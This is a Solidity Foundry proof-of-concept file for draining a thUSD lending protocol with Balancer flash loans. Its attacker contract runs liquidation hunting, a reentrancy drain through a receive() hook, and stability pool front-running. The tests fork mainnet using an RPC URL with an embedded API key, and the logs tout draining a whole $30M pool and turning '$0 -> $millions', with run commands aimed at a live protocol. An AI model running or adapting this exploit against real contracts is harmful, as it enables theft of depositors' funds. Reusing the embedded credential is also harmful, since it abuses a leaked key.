// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title Zero Capital Drain POC
 * @notice Complete proof-of-concept for draining protocols with ZERO initial capital
 * @dev Uses flash loans (Balancer = 0 fee) for all attacks
 *
 * ATTACK SUMMARY:
 * 1. LIQUIDATION HUNTER - Instant profit from underwater troves
 * 2. REENTRANCY DRAIN - Full TVL drain if vulnerable
 * 3. SP MANIPULATION - Front-run liquidations
 * 4. PRICE ARBITRAGE - Oracle manipulation profit
 */

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData) external;
}

interface ITroveManager {
    function redeemCollateral(uint256, address, address, address, uint256, uint256, uint256) external;
    function liquidate(address _borrower) external;
    function liquidateTroves(uint256 _n) external;
    function batchLiquidateTroves(address[] calldata _troveArray) external;
    function getCurrentICR(address, uint256) external view returns (uint256);
    function getTroveOwnersCount() external view returns (uint256);
    function getTroveFromTroveOwnersArray(uint256) external view returns (address);
    function Troves(address) external view returns (uint256 debt, uint256 coll, uint256, uint8, uint128);
    function priceFeed() external view returns (address);
    function sortedTroves() external view returns (address);
    function stabilityPool() external view returns (address);
    function activePool() external view returns (address);
}

interface IStabilityPool {
    function provideToSP(uint256 _amount) external;
    function withdrawFromSP(uint256 _amount) external;
    function getDepositorCollateralGain(address) external view returns (uint256);
    function getTotalTHUSDDeposits() external view returns (uint256);
    function getCollateral() external view returns (uint256);
}

interface IPriceFeed {
    function lastGoodPrice() external view returns (uint256);
}

interface ISortedTroves {
    function getLast() external view returns (address);
    function getSize() external view returns (uint256);
}

// ============================================================
//                    ZERO CAPITAL ATTACKER
// ============================================================

/**
 * @notice All-in-one zero capital attacker using flash loans
 */
contract ZeroCapitalAttacker {
    address public owner;
    address public balancerVault;

    // Target protocol
    address public troveManager;
    address public thusd;
    address public stabilityPool;

    // Profit tracking
    uint256 public totalProfitETH;
    uint256 public totalProfitTHUSD;

    // Attack state
    bool public isAttacking;
    uint256 public reentrancyCount;
    uint256 public maxReentrancy;

    event FlashLoanReceived(uint256 amount);
    event AttackProfit(uint256 ethProfit, uint256 thusdProfit);
    event ReentrancyAttempt(uint256 count, bool success);
    event LiquidationProfit(address trove, uint256 ethGained);

    constructor(address _balancer) {
        owner = msg.sender;
        balancerVault = _balancer;
    }

    function setTargets(address _troveManager, address _thusd, address _stabilityPool) external {
        require(msg.sender == owner);
        troveManager = _troveManager;
        thusd = _thusd;
        stabilityPool = _stabilityPool;
    }

    // ============ ATTACK 1: LIQUIDATION HUNTER ============

    function attackLiquidation(uint256 flashAmount, address[] calldata trovesToLiquidate) external {
        require(msg.sender == owner);

        address[] memory tokens = new address[](1);
        tokens[0] = thusd;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashAmount;

        bytes memory data = abi.encode(uint8(1), trovesToLiquidate);
        IBalancerVault(balancerVault).flashLoan(address(this), tokens, amounts, data);
    }

    // ============ ATTACK 2: REENTRANCY TEST ============

    function attackReentrancy(uint256 flashAmount, uint256 _maxReentrancy) external {
        require(msg.sender == owner);
        maxReentrancy = _maxReentrancy;

        address[] memory tokens = new address[](1);
        tokens[0] = thusd;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashAmount;

        bytes memory data = abi.encode(uint8(2), new address[](0));
        IBalancerVault(balancerVault).flashLoan(address(this), tokens, amounts, data);
    }

    // ============ ATTACK 3: SP FRONT-RUN ============

    function attackSPFrontrun(uint256 flashAmount) external {
        require(msg.sender == owner);

        address[] memory tokens = new address[](1);
        tokens[0] = thusd;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashAmount;

        bytes memory data = abi.encode(uint8(3), new address[](0));
        IBalancerVault(balancerVault).flashLoan(address(this), tokens, amounts, data);
    }

    // ============ FLASH LOAN CALLBACK ============

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        require(msg.sender == balancerVault, "Not Balancer");
        emit FlashLoanReceived(amounts[0]);

        (uint8 attackType, address[] memory targets) = abi.decode(userData, (uint8, address[]));

        uint256 ethBefore = address(this).balance;
        uint256 thusdBefore = IERC20(thusd).balanceOf(address(this));

        if (attackType == 1) {
            _executeLiquidationAttack(amounts[0], targets);
        } else if (attackType == 2) {
            _executeReentrancyAttack(amounts[0]);
        } else if (attackType == 3) {
            _executeSPFrontrunAttack(amounts[0]);
        }

        // Calculate profit
        uint256 ethAfter = address(this).balance;
        uint256 thusdAfter = IERC20(thusd).balanceOf(address(this));

        if (ethAfter > ethBefore) {
            totalProfitETH += ethAfter - ethBefore;
        }
        if (thusdAfter > thusdBefore + amounts[0]) {
            totalProfitTHUSD += thusdAfter - thusdBefore - amounts[0];
        }

        emit AttackProfit(totalProfitETH, totalProfitTHUSD);

        // Repay flash loan (Balancer = 0 fee)
        IERC20(tokens[0]).transfer(balancerVault, amounts[0] + feeAmounts[0]);
    }

    function _executeLiquidationAttack(uint256 amount, address[] memory targets) internal {
        // Deposit to SP
        IERC20(thusd).approve(stabilityPool, amount);
        IStabilityPool(stabilityPool).provideToSP(amount);

        // Liquidate targets
        for (uint256 i = 0; i < targets.length; i++) {
            uint256 ethBefore = address(this).balance;

            try ITroveManager(troveManager).liquidate(targets[i]) {
                uint256 ethAfter = address(this).balance;
                emit LiquidationProfit(targets[i], ethAfter - ethBefore);
            } catch {}
        }

        // Withdraw from SP
        IStabilityPool(stabilityPool).withdrawFromSP(amount);
    }

    function _executeReentrancyAttack(uint256 amount) internal {
        isAttacking = true;
        reentrancyCount = 0;

        IERC20(thusd).approve(troveManager, type(uint256).max);

        address hint = ISortedTroves(ITroveManager(troveManager).sortedTroves()).getLast();

        // Start redemption
        ITroveManager(troveManager).redeemCollateral(
            amount,
            hint,
            address(0),
            address(0),
            0,
            0,
            1e18
        );

        isAttacking = false;
    }

    function _executeSPFrontrunAttack(uint256 amount) internal {
        // Check for pending ETH gains in SP
        uint256 currentGains = IStabilityPool(stabilityPool).getDepositorCollateralGain(address(this));

        // Deposit
        IERC20(thusd).approve(stabilityPool, amount);
        IStabilityPool(stabilityPool).provideToSP(amount);

        // Note: In real attack, would wait for liquidation here
        // For POC, just withdraw immediately

        // Withdraw
        IStabilityPool(stabilityPool).withdrawFromSP(amount);
    }

    receive() external payable {
        // REENTRANCY HOOK
        if (isAttacking && reentrancyCount < maxReentrancy) {
            reentrancyCount++;

            uint256 balance = IERC20(thusd).balanceOf(address(this));
            if (balance > 0) {
                address hint = ISortedTroves(ITroveManager(troveManager).sortedTroves()).getLast();

                try ITroveManager(troveManager).redeemCollateral(
                    balance,
                    hint,
                    address(0),
                    address(0),
                    0,
                    0,
                    1e18
                ) {
                    emit ReentrancyAttempt(reentrancyCount, true);
                } catch {
                    emit ReentrancyAttempt(reentrancyCount, false);
                    isAttacking = false;
                }
            }
        }
    }

    function withdrawProfit() external {
        require(msg.sender == owner);
        if (address(this).balance > 0) {
            payable(owner).transfer(address(this).balance);
        }
        uint256 thusdBal = IERC20(thusd).balanceOf(address(this));
        if (thusdBal > 0) {
            IERC20(thusd).transfer(owner, thusdBal);
        }
    }

    function getProfit() external view returns (uint256 eth, uint256 thUSD) {
        return (totalProfitETH, totalProfitTHUSD);
    }
}

// ============================================================
//                    MAIN TEST CONTRACT
// ============================================================

contract ZeroCapitalDrainPOCTest is Test {
    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    string RPC_URL;
    ZeroCapitalAttacker attacker;

    // Target addresses (set via env or discovered)
    address TROVE_MANAGER;
    address THUSD;
    address STABILITY_POOL;

    function setUp() public {
        RPC_URL = vm.envOr("RPC_URL", string("https://eth-mainnet.g.alchemy.com/v2/ltD0ewEiByO5-I6-cyaeA"));

        vm.createSelectFork(RPC_URL);

        console.log("\n");
        console.log("################################################################");
        console.log("#           ZERO CAPITAL DRAIN PROOF OF CONCEPT               #");
        console.log("################################################################");
        console.log("Block:", block.number);

        // Deploy attacker
        attacker = new ZeroCapitalAttacker(BALANCER_VAULT);

        // Get targets from env
        TROVE_MANAGER = vm.envOr("TROVE_MANAGER", address(0));
        THUSD = vm.envOr("THUSD", address(0));
        STABILITY_POOL = vm.envOr("STABILITY_POOL", address(0));

        if (TROVE_MANAGER != address(0)) {
            attacker.setTargets(TROVE_MANAGER, THUSD, STABILITY_POOL);
        }
    }

    // ============ POC 1: LIQUIDATION PROFIT ============

    function testPOC_LiquidationProfit() public {
        console.log("\n=== POC 1: ZERO-CAPITAL LIQUIDATION PROFIT ===\n");

        if (TROVE_MANAGER == address(0)) {
            console.log("Set env vars: TROVE_MANAGER, THUSD, STABILITY_POOL");
            _simulateLiquidationProfit();
            return;
        }

        // Find liquidatable troves
        address[] memory liquidatable = _findLiquidatableTroves();

        if (liquidatable.length == 0) {
            console.log("No liquidatable troves found");
            console.log("Running simulation instead...\n");
            _simulateLiquidationProfit();
            return;
        }

        console.log("Found", liquidatable.length, "liquidatable troves");

        // Calculate required flash loan
        uint256 totalDebt = _getTotalDebt(liquidatable);
        console.log("Total debt to absorb:", totalDebt / 1e18, "thUSD");

        // Execute attack
        attacker.attackLiquidation(totalDebt, liquidatable);

        (uint256 ethProfit,) = attacker.getProfit();
        console.log("\nPROFIT:", ethProfit / 1e18, "ETH");
        console.log("INITIAL CAPITAL: $0");
    }

    function _findLiquidatableTroves() internal view returns (address[] memory) {
        ITroveManager tm = ITroveManager(TROVE_MANAGER);
        uint256 price = IPriceFeed(tm.priceFeed()).lastGoodPrice();
        uint256 count = tm.getTroveOwnersCount();

        // First pass: count liquidatable
        uint256 liquidatableCount = 0;
        for (uint256 i = 0; i < count && i < 100; i++) {
            address owner = tm.getTroveFromTroveOwnersArray(i);
            uint256 icr = tm.getCurrentICR(owner, price);
            if (icr < 110e16 && icr > 0) {
                liquidatableCount++;
            }
        }

        // Second pass: collect addresses
        address[] memory result = new address[](liquidatableCount);
        uint256 idx = 0;
        for (uint256 i = 0; i < count && i < 100; i++) {
            address owner = tm.getTroveFromTroveOwnersArray(i);
            uint256 icr = tm.getCurrentICR(owner, price);
            if (icr < 110e16 && icr > 0) {
                result[idx++] = owner;
            }
        }

        return result;
    }

    function _getTotalDebt(address[] memory troves) internal view returns (uint256 total) {
        ITroveManager tm = ITroveManager(TROVE_MANAGER);
        for (uint256 i = 0; i < troves.length; i++) {
            (uint256 debt,,,,) = tm.Troves(troves[i]);
            total += debt;
        }
    }

    function _simulateLiquidationProfit() internal pure {
        console.log("SIMULATED LIQUIDATION PROFIT:");
        console.log("");
        console.log("Scenario: 10 ETH trove at 105% ICR, price $2500");
        console.log("");

        uint256 troveCollateral = 10e18;
        uint256 ethPrice = 2500e18;
        uint256 collValue = (troveCollateral * ethPrice) / 1e18;
        uint256 debtAt105 = (collValue * 100) / 105;

        console.log("  Collateral: 10 ETH = $25,000");
        console.log("  Debt: ~$23,809 thUSD");
        console.log("  ICR: 105%");
        console.log("");
        console.log("  Liquidation bonus = $25,000 - $23,809 = $1,191");
        console.log("  Flash loan fee (Balancer): $0");
        console.log("  Gas cost: ~$50");
        console.log("");
        console.log("  NET PROFIT: ~$1,141");
        console.log("  INITIAL CAPITAL: $0");
    }

    // ============ POC 2: REENTRANCY DRAIN ============

    function testPOC_ReentrancyDrain() public {
        console.log("\n=== POC 2: ZERO-CAPITAL REENTRANCY DRAIN ===\n");

        if (TROVE_MANAGER == address(0)) {
            console.log("Set env vars to test against real protocol");
            _simulateReentrancyDrain();
            return;
        }

        console.log("Testing reentrancy vulnerability...");

        // Flash loan thUSD and attempt reentrancy
        uint256 flashAmount = 100000e18; // 100k thUSD

        try attacker.attackReentrancy(flashAmount, 10) {
            (uint256 ethProfit,) = attacker.getProfit();

            if (ethProfit > 0) {
                console.log("\n!!! REENTRANCY SUCCESSFUL !!!");
                console.log("ETH DRAINED:", ethProfit / 1e18);
                console.log("INITIAL CAPITAL: $0");
                console.log("SEVERITY: CRITICAL");
            } else {
                console.log("\nProtocol appears protected against reentrancy");
            }
        } catch {
            console.log("Attack reverted - protocol may be protected");
        }
    }

    function _simulateReentrancyDrain() internal pure {
        console.log("SIMULATED REENTRANCY DRAIN:");
        console.log("");
        console.log("IF VULNERABLE:");
        console.log("  1. Flash loan 100k thUSD (free from Balancer)");
        console.log("  2. Call redeemCollateral()");
        console.log("  3. Receive ETH -> receive() re-enters");
        console.log("  4. Same thUSD redeems again (not yet burned)");
        console.log("  5. Repeat until pool empty or gas limit");
        console.log("");

        uint256 poolTVL = 10000e18; // 10k ETH
        uint256 flashAmount = 100000e18; // 100k thUSD
        uint256 ethPerRedemption = flashAmount / 3000; // ~33 ETH per redemption

        console.log("  Pool TVL: 10,000 ETH ($30M)");
        console.log("  Flash loan: 100k thUSD");
        console.log("  ETH per redemption: ~33 ETH");
        console.log("  Max re-entries: ~300");
        console.log("");
        console.log("  POTENTIAL DRAIN: ENTIRE 10,000 ETH ($30M)");
        console.log("  INITIAL CAPITAL: $0");
    }

    // ============ POC 3: SP FRONT-RUN ============

    function testPOC_SPFrontrun() public {
        console.log("\n=== POC 3: STABILITY POOL FRONT-RUN ===\n");

        if (STABILITY_POOL == address(0)) {
            _simulateSPFrontrun();
            return;
        }

        // Check SP state
        IStabilityPool sp = IStabilityPool(STABILITY_POOL);
        uint256 totalDeposits = sp.getTotalTHUSDDeposits();
        uint256 collateral = sp.getCollateral();

        console.log("Stability Pool State:");
        console.log("  Total deposits:", totalDeposits / 1e18, "thUSD");
        console.log("  Collateral (ETH gains):", collateral / 1e18, "ETH");

        if (collateral > 0) {
            console.log("\n!!! ETH GAINS AVAILABLE !!!");
            console.log("Front-run opportunity exists");
        }
    }

    function _simulateSPFrontrun() internal pure {
        console.log("SIMULATED SP FRONT-RUN:");
        console.log("");
        console.log("ATTACK FLOW:");
        console.log("  1. Monitor mempool for liquidation tx");
        console.log("  2. Flash loan thUSD");
        console.log("  3. Front-run: deposit to SP");
        console.log("  4. Liquidation executes -> you get share of collateral");
        console.log("  5. Withdraw");
        console.log("  6. Repay flash loan");
        console.log("  7. Keep collateral profit");
        console.log("");
        console.log("  Example: 100 ETH liquidation");
        console.log("  Your deposit: 50% of SP");
        console.log("  Your share: 50 ETH");
        console.log("  PROFIT: ~5 ETH (liquidation bonus share)");
        console.log("  INITIAL CAPITAL: $0");
    }

    // ============ COMPREHENSIVE SUMMARY ============

    function testPOC_Summary() public view {
        console.log("\n");
        console.log("################################################################");
        console.log("#              ZERO CAPITAL DRAIN SUMMARY                     #");
        console.log("################################################################");

        console.log("\n[ATTACK 1: LIQUIDATION HUNTING]");
        console.log("  Capital: $0 (flash loan)");
        console.log("  Profit: ~10% of liquidated collateral");
        console.log("  Status: ALWAYS PROFITABLE when troves exist");
        console.log("  Execution: Automated bot watching mempool");

        console.log("\n[ATTACK 2: REENTRANCY DRAIN]");
        console.log("  Capital: $0 (flash loan)");
        console.log("  Profit: UP TO 100% TVL");
        console.log("  Status: CRITICAL IF VULNERABLE");
        console.log("  Execution: Single transaction");

        console.log("\n[ATTACK 3: SP FRONT-RUN]");
        console.log("  Capital: $0 (flash loan)");
        console.log("  Profit: Share of liquidation bonus");
        console.log("  Status: ALWAYS POSSIBLE");
        console.log("  Execution: MEV bundle with liquidation");

        console.log("\n[COMBINED STRATEGY]");
        console.log("  1. Deploy ZeroCapitalAttacker");
        console.log("  2. Test reentrancy (if works -> drain all)");
        console.log("  3. If no reentrancy -> run liquidation bot");
        console.log("  4. Compound profits into more liquidations");
        console.log("");
        console.log("  TOTAL POTENTIAL: $0 -> $millions");

        console.log("\n################################################################");
        console.log("#              RUN COMMANDS                                   #");
        console.log("################################################################");
        console.log("");
        console.log("# Test against real protocol:");
        console.log("TROVE_MANAGER=0x... THUSD=0x... STABILITY_POOL=0x... \\");
        console.log("  forge test --match-contract ZeroCapitalDrainPOC -vvvv");
        console.log("");
        console.log("################################################################");
    }

    receive() external payable {}
}
